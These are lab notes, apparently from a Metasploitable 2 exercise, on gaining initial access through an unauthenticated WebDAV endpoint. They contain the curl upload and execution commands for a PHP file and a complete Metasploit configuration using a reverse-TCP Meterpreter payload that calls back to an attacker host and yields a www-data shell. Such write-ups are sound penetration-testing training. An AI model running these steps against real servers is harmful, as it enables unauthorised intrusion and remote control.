# MS2 — WebDAV Initial Access

## Endpoint

```text
http://192.168.89.128/dav/
```

## Validation

A harmless PHP file was created locally:

```bash
cat > ~/ms2-dav-test.php <<'EOF'
<?php
echo "MS2 WebDAV PHP execution confirmed";
?>
EOF
```

Uploaded with:

```bash
curl -i -T ~/ms2-dav-test.php http://192.168.89.128/dav/ms2-dav-test.php
```

Requested with:

```bash
curl -i http://192.168.89.128/dav/ms2-dav-test.php
```

The response confirmed PHP execution.

## Security Impact

The endpoint allowed:
1. unauthenticated access,
2. file upload using WebDAV `PUT`,
3. server-side PHP execution.

Therefore the endpoint provided a remote code execution condition.

## Metasploit

Module:

```text
exploit/multi/http/webdav_upload_php
```

Configuration:

```text
set RHOSTS 192.168.89.128
set RPORT 80
set URI /dav/
set LHOST 192.168.89.1
set LPORT 4444
```

Default payload used:

```text
php/meterpreter/reverse_tcp
```

Metasploit confirmed the target was vulnerable and opened a Meterpreter session.

## Result

Initial access was obtained as the web-server account:

```text
www-data
```

## Important Lesson

The Metasploit result was not treated as the original proof. Manual PHP upload and execution were validated first; Metasploit then automated the already-confirmed attack path.
